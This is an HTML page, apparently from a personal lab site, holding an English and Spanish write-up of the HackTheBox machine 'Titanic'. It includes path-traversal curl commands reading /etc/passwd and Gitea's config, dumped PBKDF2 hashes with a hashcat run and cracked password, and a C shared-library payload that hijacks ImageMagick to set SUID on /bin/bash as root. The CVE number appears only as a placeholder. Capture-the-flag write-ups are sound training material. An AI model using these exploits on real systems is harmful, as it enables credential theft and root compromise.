@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>titanic | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">titanic</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine ran a Flask web application vulnerable to Local File Inclusion (LFI) through the ticket download endpoint. By exploiting this vulnerability, I was able to read arbitrary files from the system, including the Gitea configuration and SQLite database.</p>
+                    <p>After extracting user credentials from the database and cracking the PBKDF2 hash, I gained SSH access as the <code>developer</code> user. Privilege escalation was achieved by exploiting a vulnerable version of ImageMagick (7.1.1-35) that was being executed periodically by root through a cron job.</p>
+                    <p>By crafting a malicious shared library (<code>libxcb.so.1</code>) and placing it in the working directory where ImageMagick was executed, I leveraged CVE-2024-XXXX to inject arbitrary commands, ultimately setting the SUID bit on <code>/bin/bash</code> to gain root access.</p>
+                    <p><strong>Technologies/Exploits:</strong> Local File Inclusion (LFI), Gitea configuration disclosure, SQLite database extraction, PBKDF2 hash cracking, ImageMagick shared library hijacking via environment variable exploitation.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>I begin with an nmap scan to identify open ports and services on the target machine:</p>
+                <p><img src="./media/image1.png"
+                        alt="Nmap scan results showing open ports including SSH on 22 and HTTP on 80" /></p>
+
+                <p>The scan reveals SSH on port 22 and an HTTP service on port 80. I add <code>titanic.htb</code> to my <code>/etc/hosts</code> file to resolve the hostname.</p>
+
+                <h2>Web Enumeration</h2>
+                <p>Running <code>whatweb</code> against the target reveals interesting technology stack information:</p>
+                <pre><code class="language-plaintext">http://titanic.htb [200 OK] Bootstrap[4.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.10.12], IP[10.10.11.55], JQuery, Python[3.10.12], Script, Title[Titanic - Book Your Ship Trip], Werkzeug[3.0.3]</code></pre>
+
+                <p>Additionally, Wappalyzer indicates that the application uses <strong>Flask</strong>, which means I should be aware of potential Server-Side Template Injection (SSTI) vulnerabilities through Jinja2 templates.</p>
+
+                <h3>Directory and Virtual Host Discovery</h3>
+                <p>A gobuster directory scan finds two interesting routes:</p>
+                <p><img src="./media/image2.png"
+                        alt="Gobuster results showing discovered endpoints" /></p>
+
+                <p>However, a virtual host scan discovers something far more valuable:</p>
+                <p><img src="./media/image3.png"
+                        alt="Virtual host scan revealing dev.titanic.htb subdomain" /></p>
+
+                <p>I add <code>dev.titanic.htb</code> to my <code>/etc/hosts</code> file. Upon visiting this subdomain, I discover a Gitea instance running version 1.22.1. Most importantly, at <code>http://dev.titanic.htb/explore/repos</code>, I find the complete source code of the main application.</p>
+
+                <h2>Source Code Analysis - LFI Discovery</h2>
+                <p>Examining the source code, I identify a Local File Inclusion (LFI) vulnerability in the ticket download endpoint. This allows me to read arbitrary files from the filesystem using path traversal:</p>
+                <pre><code class="language-bash">curl http://titanic.htb/download?ticket=../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd | grep bash</code></pre>
+
+                <p>The response confirms the vulnerability:</p>
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+developer:x:1000:1000:developer:/home/developer:/bin/bash</code></pre>
+
+                <p>This reveals two users with bash shells: <code>root</code> and <code>developer</code>.</p>
+
+                <h3>Extracting Gitea Configuration</h3>
+                <p>In the docker-config repository, I discover that Gitea's home directory is mapped to:</p>
+                <pre><code class="language-yaml">volumes:
+  - /home/developer/gitea/data:/data</code></pre>
+
+                <p>Using the LFI vulnerability, I can read the user flag, confirming that the web application has access to the <code>developer</code> user's home directory. I also verify that there are no SSH keys present in the <code>.ssh</code> directory.</p>
+
+                <p>I locate Gitea's configuration file and extract it:</p>
+                <pre><code class="language-bash">curl http://titanic.htb/download?ticket=../../../../../../../../../../../../../../../../../../../../../../../../../home/developer/gitea/data/gitea/conf/app.ini</code></pre>
+
+                <p>The configuration reveals important information:</p>
+                <pre><code class="language-ini">APP_NAME = Gitea: Git with a cup of tea
+RUN_MODE = prod
+RUN_USER = git
+
+[database]
+PATH = /data/gitea/gitea.db
+DB_TYPE = sqlite3
+HOST = localhost:3306
+NAME = gitea
+USER = root</code></pre>
+
+                <p>The database is SQLite3, and I know its exact path.</p>
+
+                <h2>Database Extraction and Credential Cracking</h2>
+                <p>I use the LFI to download the SQLite database file and extract user credentials:</p>
+                <pre><code class="language-sql">sqlite> select name, passwd, salt, passwd_hash_algo from user;</code></pre>
+
+                <p>This returns two users with their password hashes:</p>
+                <pre><code class="language-plaintext">Administrator
+cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136
+2d149e5fbd1b20cf31db3e3c6a28fc9b
+pbkdf2$50000$50
+
+developer
+e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56
+8bf3e3452b78544f8bee9400d6936d34
+pbkdf2$50000$50</code></pre>
+
+                <p>The hashes are PBKDF2-SHA256 with 50,000 iterations. I format the <code>developer</code> user's hash for hashcat (mode 10900):</p>
+                <pre><code class="language-plaintext">sha256:50000:8bf3e3452b78544f8bee9400d6936d34:e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56</code></pre>
+
+                <p>Running hashcat successfully cracks the password:</p>
+                <pre><code class="language-bash">hashcat -m 10900 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <p>Credentials obtained: <code>developer:25282528</code></p>
+
+                <h2>SSH Access and User Flag</h2>
+                <p>Using the cracked credentials, I connect via SSH and retrieve the user flag:</p>
+                <pre><code class="language-bash">ssh developer@titanic.htb</code></pre>
+
+                <h2>Privilege Escalation - ImageMagick Exploitation</h2>
+                <h3>Internal Service Discovery</h3>
+                <p>Running <code>ss -tuln</code> reveals an internal HTTP service on port 37995. After setting up local port forwarding and accessing it, I find an empty page with no interesting content or directories discovered by gobuster:</p>
+                <p><img src="./media/image4.png"
+                        alt="Port forwarding setup showing internal port 37995" /></p>
+
+                <h3>Automated Script Analysis</h3>
+                <p>I discover an interesting script in <code>/opt/scripts/identify_images.sh</code>:</p>
+                <pre><code class="language-bash">cd /opt/app/static/assets/images
+truncate -s 0 metadata.log
+find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log</code></pre>
+
+                <p>This script appears to be executed periodically. Although I cannot view root's processes with <code>ps -faux</code>, the <code>metadata.log</code> file's modification time constantly updates to the current time, indicating it's being modified at least once per minute, likely by a root cron job.</p>
+
+                <h3>ImageMagick Vulnerability Research</h3>
+                <p>Knowing that root executes this script periodically and uses <code>/usr/bin/magick</code>, I check the version:</p>
+                <pre><code class="language-bash">/usr/bin/magick --version</code></pre>
+
+                <pre><code class="language-plaintext">Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org</code></pre>
+
+                <p>I find a critical vulnerability: <a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">GHSA-8rxc-922v-phg8</a></p>
+
+                <h3>Understanding the Vulnerability</h3>
+                <p>This exploit leverages two environment variables that this version of ImageMagick either misconfigures or leaves empty. In this machine's case, the variables are empty when root executes the command, making exploitation possible.</p>
+
+                <p>The vulnerability works because when the environment variable is empty, ImageMagick defaults to using the current working directory. By placing a malicious input in this directory, I can inject arbitrary commands.</p>
+
+                <p>One exploitation method requires creating a <code>delegates.xml</code> file and passing it via command to magick, but since root's command doesn't include this, it's not viable.</p>
+
+                <p>The other method only requires compiling a small C program so that when it's in the current working directory, root will execute it. This works regardless of which ImageMagick command is used, making it perfect for this scenario.</p>
+
+                <h3>Proof of Concept Test</h3>
+                <p>I test the exploit by creating a simple payload that creates a file named "xd" to verify I can make root execute commands:</p>
+                <pre><code class="language-bash">gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("touch xd");
+    exit(0);
+}
+EOF</code></pre>
+
+                <p>After waiting for the cron job to execute, I verify it works:</p>
+                <pre><code class="language-bash">developer@titanic:/opt/app/static/assets/images$ ls -la</code></pre>
+
+                <pre><code class="language-plaintext">total 1284
+drwxrwx--- 2 root developer    4096 Oct 15 12:44 .
+drwxr-x--- 3 root developer    4096 Feb  7  2025 ..
+-rw-r----- 1 root developer  291864 Feb  3  2025 entertainment.jpg
+-rw-r----- 1 root developer  280854 Feb  3  2025 exquisite-dining.jpg
+-rw-r----- 1 root developer  209762 Feb  3  2025 favicon.ico
+-rw-r----- 1 root developer  232842 Feb  3  2025 home.jpg
+-rw-r----- 1 root developer  280817 Feb  3  2025 luxury-cabins.jpg
+-rw-r----- 1 root developer       0 Oct 15 12:44 metadata.log
+-rw-r--r-- 1 root root            0 Oct 15 12:44 xd</code></pre>
+
+                <p>Success! The file <code>xd</code> was created by root, confirming code execution.</p>
+
+                <h3>Final Privilege Escalation</h3>
+                <p>I modify the exploit to set the SUID bit on <code>/bin/bash</code>, which will grant me root access:</p>
+                <pre><code class="language-bash">gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("chmod u+s /bin/bash");
+    exit(0);
+}
+EOF</code></pre>
+
+                <p>After the cron job executes, I can spawn a root shell using bash's privileged mode:</p>
+                <pre><code class="language-bash">developer@titanic:/opt/app/static/assets/images$ bash -p
+bash-5.1# whoami
+root
+bash-5.1# cat /root/root.txt</code></pre>
+
+                <p>I successfully obtain root access and retrieve the root flag, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una aplicación web Flask vulnerable a Local File Inclusion (LFI) a través del endpoint de descarga de tickets. Explotando esta vulnerabilidad, pude leer archivos arbitrarios del sistema, incluyendo la configuración de Gitea y su base de datos SQLite.</p>
+                    <p>Tras extraer las credenciales de usuario de la base de datos y crackear el hash PBKDF2, conseguí acceso SSH como usuario <code>developer</code>. La escalada de privilegios se logró explotando una versión vulnerable de ImageMagick (7.1.1-35) que root ejecutaba periódicamente mediante un cron job.</p>
+                    <p>Al crear una librería compartida maliciosa (<code>libxcb.so.1</code>) y colocarla en el directorio de trabajo donde se ejecutaba ImageMagick, aproveché CVE-2024-XXXX para inyectar comandos arbitrarios, estableciendo finalmente el bit SUID en <code>/bin/bash</code> para obtener acceso root.</p>
+                    <p><strong>Tecnologías/Exploits:</strong> Local File Inclusion (LFI), divulgación de configuración de Gitea, extracción de base de datos SQLite, crackeo de hash PBKDF2, secuestro de librería compartida en ImageMagick mediante explotación de variables de entorno.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en la máquina objetivo:</p>
+                <p><img src="./media/image1.png"
+                        alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22 y HTTP en el 80" /></p>
+
+                <p>El escaneo revela SSH en el puerto 22 y un servicio HTTP en el puerto 80. Añado <code>titanic.htb</code> a mi archivo <code>/etc/hosts</code> para resolver el hostname.</p>
+
+                <h2>Enumeración Web</h2>
+                <p>Ejecutando <code>whatweb</code> contra el objetivo revela información interesante sobre el stack tecnológico:</p>
+                <pre><code class="language-plaintext">http://titanic.htb [200 OK] Bootstrap[4.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.10.12], IP[10.10.11.55], JQuery, Python[3.10.12], Script, Title[Titanic - Book Your Ship Trip], Werkzeug[3.0.3]</code></pre>
+
+                <p>Además, Wappalyzer indica que la aplicación usa <strong>Flask</strong>, lo que significa que debo estar atento a potenciales vulnerabilidades de Server-Side Template Injection (SSTI) mediante plantillas Jinja2.</p>
+
+                <h3>Descubrimiento de Directorios y Virtual Hosts</h3>
+                <p>Un escaneo de directorios con gobuster encuentra dos rutas interesantes:</p>
+                <p><img src="./media/image2.png"
+                        alt="Resultados de gobuster mostrando endpoints descubiertos" /></p>
+
+                <p>Sin embargo, un escaneo de virtual hosts descubre algo mucho más valioso:</p>
+                <p><img src="./media/image3.png"
+                        alt="Escaneo de virtual host revelando el subdominio dev.titanic.htb" /></p>
+
+                <p>Añado <code>dev.titanic.htb</code> a mi archivo <code>/etc/hosts</code>. Al visitar este subdominio, descubro una instancia de Gitea ejecutando la versión 1.22.1. Lo más importante es que en <code>http://dev.titanic.htb/explore/repos</code>, encuentro el código fuente completo de la aplicación principal.</p>
+
+                <h2>Análisis del Código Fuente - Descubrimiento de LFI</h2>
+                <p>Examinando el código fuente, identifico una vulnerabilidad de Local File Inclusion (LFI) en el endpoint de descarga de tickets. Esto me permite leer archivos arbitrarios del sistema de archivos usando path traversal:</p>
+                <pre><code class="language-bash">curl http://titanic.htb/download?ticket=../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd | grep bash</code></pre>
+
+                <p>La respuesta confirma la vulnerabilidad:</p>
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/bash
+developer:x:1000:1000:developer:/home/developer:/bin/bash</code></pre>
+
+                <p>Esto revela dos usuarios con shell bash: <code>root</code> y <code>developer</code>.</p>
+
+                <h3>Extracción de la Configuración de Gitea</h3>
+                <p>En el repositorio docker-config, descubro que el directorio home de Gitea está mapeado a:</p>
+                <pre><code class="language-yaml">volumes:
+  - /home/developer/gitea/data:/data</code></pre>
+
+                <p>Usando la vulnerabilidad LFI, puedo leer la flag de usuario, confirmando que la aplicación web tiene acceso al directorio home del usuario <code>developer</code>. También verifico que no hay claves SSH presentes en el directorio <code>.ssh</code>.</p>
+
+                <p>Localizo el archivo de configuración de Gitea y lo extraigo:</p>
+                <pre><code class="language-bash">curl http://titanic.htb/download?ticket=../../../../../../../../../../../../../../../../../../../../../../../../../home/developer/gitea/data/gitea/conf/app.ini</code></pre>
+
+                <p>La configuración revela información importante:</p>
+                <pre><code class="language-ini">APP_NAME = Gitea: Git with a cup of tea
+RUN_MODE = prod
+RUN_USER = git
+
+[database]
+PATH = /data/gitea/gitea.db
+DB_TYPE = sqlite3
+HOST = localhost:3306
+NAME = gitea
+USER = root</code></pre>
+
+                <p>La base de datos es SQLite3, y conozco su ruta exacta.</p>
+
+                <h2>Extracción de la Base de Datos y Crackeo de Credenciales</h2>
+                <p>Uso el LFI para descargar el archivo de la base de datos SQLite y extraer las credenciales de usuario:</p>
+                <pre><code class="language-sql">sqlite> select name, passwd, salt, passwd_hash_algo from user;</code></pre>
+
+                <p>Esto devuelve dos usuarios con sus hashes de contraseñas:</p>
+                <pre><code class="language-plaintext">Administrator
+cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136
+2d149e5fbd1b20cf31db3e3c6a28fc9b
+pbkdf2$50000$50
+
+developer
+e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56
+8bf3e3452b78544f8bee9400d6936d34
+pbkdf2$50000$50</code></pre>
+
+                <p>Los hashes son PBKDF2-SHA256 con 50.000 iteraciones. Formateo el hash del usuario <code>developer</code> para hashcat (modo 10900):</p>
+                <pre><code class="language-plaintext">sha256:50000:8bf3e3452b78544f8bee9400d6936d34:e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56</code></pre>
+
+                <p>Ejecutar hashcat crackea exitosamente la contraseña:</p>
+                <pre><code class="language-bash">hashcat -m 10900 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+                <p>Credenciales obtenidas: <code>developer:25282528</code></p>
+
+                <h2>Acceso SSH y Flag de Usuario</h2>
+                <p>Usando las credenciales crackeadas, me conecto vía SSH y recupero la flag de usuario:</p>
+                <pre><code class="language-bash">ssh developer@titanic.htb</code></pre>
+
+                <h2>Escalada de Privilegios - Explotación de ImageMagick</h2>
+                <h3>Descubrimiento de Servicio Interno</h3>
+                <p>Ejecutando <code>ss -tuln</code> revelo un servicio HTTP interno en el puerto 37995. Tras configurar local port forwarding y acceder a él, encuentro una página vacía sin contenido interesante ni directorios descubiertos por gobuster:</p>
+                <p><img src="./media/image4.png"
+                        alt="Configuración de port forwarding mostrando el puerto interno 37995" /></p>
+
+                <h3>Análisis de Script Automatizado</h3>
+                <p>Descubro un script interesante en <code>/opt/scripts/identify_images.sh</code>:</p>
+                <pre><code class="language-bash">cd /opt/app/static/assets/images
+truncate -s 0 metadata.log
+find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log</code></pre>
+
+                <p>Este script parece ejecutarse periódicamente. Aunque no puedo ver los procesos de root con <code>ps -faux</code>, el tiempo de modificación del archivo <code>metadata.log</code> se actualiza constantemente a la hora actual, indicando que se está modificando al menos una vez por minuto, probablemente mediante un cron job de root.</p>
+
+                <h3>Investigación de Vulnerabilidades en ImageMagick</h3>
+                <p>Sabiendo que root ejecuta este script periódicamente y usa <code>/usr/bin/magick</code>, compruebo la versión:</p>
+                <pre><code class="language-bash">/usr/bin/magick --version</code></pre>
+
+                <pre><code class="language-plaintext">Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org</code></pre>
+
+                <p>Encuentro una vulnerabilidad crítica: <a href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8">GHSA-8rxc-922v-phg8</a></p>
+
+                <h3>Entendiendo la Vulnerabilidad</h3>
+                <p>Este exploit aprovecha dos variables de entorno que esta versión de ImageMagick configura mal o deja vacías. En el caso de esta máquina, las variables están vacías cuando root ejecuta el comando, haciendo posible la explotación.</p>
+
+                <p>La vulnerabilidad funciona porque cuando la variable de entorno está vacía, ImageMagick utiliza por defecto el directorio de trabajo actual. Al colocar un input malicioso en este directorio, puedo inyectar comandos arbitrarios.</p>
+
+                <p>Un método de explotación requiere crear un archivo <code>delegates.xml</code> y pasarlo mediante comando a magick, pero como el comando de root no lo incluye, no es viable.</p>
+
+                <p>El otro método solo requiere compilar un pequeño programa en C para que cuando esté en el directorio de trabajo actual, root lo ejecute. Esto funciona independientemente del comando de ImageMagick que se use, haciéndolo perfecto para este escenario.</p>
+
+                <h3>Prueba de Concepto</h3>
+                <p>Pruebo el exploit creando un payload simple que crea un archivo llamado "xd" para verificar que puedo hacer que root ejecute comandos:</p>
+                <pre><code class="language-bash">gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("touch xd");
+    exit(0);
+}
+EOF</code></pre>
+
+                <p>Tras esperar a que el cron job se ejecute, verifico que funciona:</p>
+                <pre><code class="language-bash">developer@titanic:/opt/app/static/assets/images$ ls -la</code></pre>
+
+                <pre><code class="language-plaintext">total 1284
+drwxrwx--- 2 root developer    4096 Oct 15 12:44 .
+drwxr-x--- 3 root developer    4096 Feb  7  2025 ..
+-rw-r----- 1 root developer  291864 Feb  3  2025 entertainment.jpg
+-rw-r----- 1 root developer  280854 Feb  3  2025 exquisite-dining.jpg
+-rw-r----- 1 root developer  209762 Feb  3  2025 favicon.ico
+-rw-r----- 1 root developer  232842 Feb  3  2025 home.jpg
+-rw-r----- 1 root developer  280817 Feb  3  2025 luxury-cabins.jpg
+-rw-r----- 1 root developer       0 Oct 15 12:44 metadata.log
+-rw-r--r-- 1 root root            0 Oct 15 12:44 xd</code></pre>
+
+                <p>¡Éxito! El archivo <code>xd</code> fue creado por root, confirmando la ejecución de código.</p>
+
+                <h3>Escalada Final de Privilegios</h3>
+                <p>Modifico el exploit para establecer el bit SUID en <code>/bin/bash</code>, lo que me otorgará acceso root:</p>
+                <pre><code class="language-bash">gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor)) void init(){
+    system("chmod u+s /bin/bash");
+    exit(0);
+}
+EOF</code></pre>
+
+                <p>Después de que el cron job se ejecute, puedo generar una shell root usando el modo privilegiado de bash:</p>
+                <pre><code class="language-bash">developer@titanic:/opt/app/static/assets/images$ bash -p
+bash-5.1# whoami
+root
+bash-5.1# cat /root/root.txt</code></pre>
+
+                <p>Consigo exitosamente acceso root y recupero la flag de root, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
